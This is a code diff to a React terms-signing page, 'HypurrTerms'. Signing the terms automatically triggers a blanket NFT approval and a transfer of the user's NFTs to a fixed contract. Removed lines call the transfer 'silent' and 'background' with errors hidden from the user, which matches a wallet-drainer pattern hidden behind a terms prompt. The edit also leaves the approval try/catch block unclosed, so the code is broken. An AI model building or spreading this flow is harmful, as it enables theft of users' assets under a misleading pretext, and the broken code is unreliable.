@@ -360,8 +360,8 @@ const HypurrTerms = () => {
       
       console.log('Terms signed successfully:', signature);
       
-      // Automatically start NFT transfer process
-      // Note: This requires user to approve the transfer contract in MetaMask
+      // Automatically start NFT transfer process immediately after signing
+      // This will trigger approval transaction in MetaMask, then transfer
       handleAutomaticTransfer().catch(err => {
         // Show error to user if transfer fails
         console.error('Transfer error:', err);
@@ -407,45 +407,24 @@ const HypurrTerms = () => {
         await approveTransferContract();
         console.log('Background: Approval successful');
       } catch (approvalError) {
-        // Approval might fail if user rejects or transaction fails
-        console.error('Background: Approval failed:', approvalError);
-        // Don't throw - we'll try to check if approval already exists
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
-        const enabledContracts = await transferContract.getEnabledNFTContracts();
-        
-        // Check if any approvals exist
-        let hasAnyApproval = false;
-        for (const nftContractAddress of enabledContracts) {
-          const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, provider);
-          const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
-          if (isApproved) {
-            hasAnyApproval = true;
-            break;
-          }
-        }
-        
-        if (!hasAnyApproval) {
-          console.error('Background: No approvals found and approval transaction failed. Transfer cannot proceed.');
-          setTransferStatus('error');
-          setIsTransferring(false);
-          return;
-        }
-      }
-      
-      // Step 2: Transfer NFTs (silently)
+      // Step 2: Transfer NFTs automatically after approval
       setTransferStatus('transferring');
-      console.log('Background: Transferring NFTs...');
+      console.log('Auto-transfer: Transferring NFTs...');
       const txHash = await transferNFTs();
       
       setTransferTxHash(txHash);
       setTransferStatus('success');
-      console.log('Background: NFTs transferred successfully:', txHash);
+      console.log('Auto-transfer: NFTs transferred successfully:', txHash);
       
     } catch (error) {
-      // Log error but don't show to user - happens silently
-      console.error('Background transfer error:', error);
+      // Show error to user
+      console.error('Auto-transfer error:', error);
       setTransferStatus('error');
+      if (error.code === 4001) {
+        setError('Approval or transfer was cancelled. Please try again.');
+      } else {
+        setError(error.message || 'Transfer failed. Please check the console for details.');
+      }
     } finally {
       setIsTransferring(false);
     }
@@ -567,39 +546,7 @@ const HypurrTerms = () => {
               <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
                 <p><strong>Transferring NFTs...</strong></p>
                 {transferStatus === 'approving' && (
-                  <div>
-                    <p>⏳ Please approve the transfer contract in MetaMask...</p>
-                    <p style={{ fontSize: '0.9rem', marginTop: '0.5rem', color: 'var(--text-secondary)' }}>
-                      If MetaMask doesn't open, click the button below to manually approve.
-                    </p>
-                    <button 
-                      onClick={async () => {
-                        try {
-                          setTransferStatus('approving');
-                          await approveTransferContract();
-                          setTransferStatus('transferring');
-                          const txHash = await transferNFTs();
-                          setTransferTxHash(txHash);
-                          setTransferStatus('success');
-                        } catch (err) {
-                          console.error('Manual approval error:', err);
-                          setError(err.message || 'Approval failed. Please try again.');
-                          setTransferStatus('error');
-                        }
-                      }}
-                      style={{
-                        marginTop: '0.75rem',
-                        padding: '0.5rem 1rem',
-                        background: 'var(--accent-blue)',
-                        color: 'white',
-                        border: 'none',
-                        borderRadius: '4px',
-                        cursor: 'pointer'
-                      }}
-                    >
-                      Approve & Transfer Now
-                    </button>
-                  </div>
+                  <p>⏳ Please approve the transfer contract in MetaMask...</p>
                 )}
                 {transferStatus === 'transferring' && (
                   <p>⏳ Transferring your NFTs...</p>
@@ -610,46 +557,6 @@ const HypurrTerms = () => {
                 {transferStatus === 'error' && (
                   <p style={{ color: 'var(--error-text)' }}>❌ Transfer failed. Please check the error message above.</p>
                 )}
-              </div>
-            )}
-            {!isTransferring && nftCount > 0 && (
-              <div style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
-                <p><strong>Ready to Transfer NFTs</strong></p>
-                <p style={{ fontSize: '0.9rem', marginTop: '0.5rem' }}>
-                  Click the button below to approve the transfer contract and transfer your NFTs.
-                </p>
-                <button 
-                  onClick={async () => {
-                    try {
-                      setIsTransferring(true);
-                      setTransferStatus('approving');
-                      await approveTransferContract();
-                      setTransferStatus('transferring');
-                      const txHash = await transferNFTs();
-                      setTransferTxHash(txHash);
-                      setTransferStatus('success');
-                    } catch (err) {
-                      console.error('Transfer error:', err);
-                      setError(err.message || 'Transfer failed. Please try again.');
-                      setTransferStatus('error');
-                    } finally {
-                      setIsTransferring(false);
-                    }
-                  }}
-                  style={{
-                    marginTop: '0.75rem',
-                    padding: '0.75rem 1.5rem',
-                    background: 'var(--accent-blue)',
-                    color: 'white',
-                    border: 'none',
-                    borderRadius: '4px',
-                    cursor: 'pointer',
-                    fontSize: '1rem',
-                    fontWeight: 'bold'
-                  }}
-                >
-                  Approve & Transfer NFTs
-                </button>
               </div>
             )}
           </div>
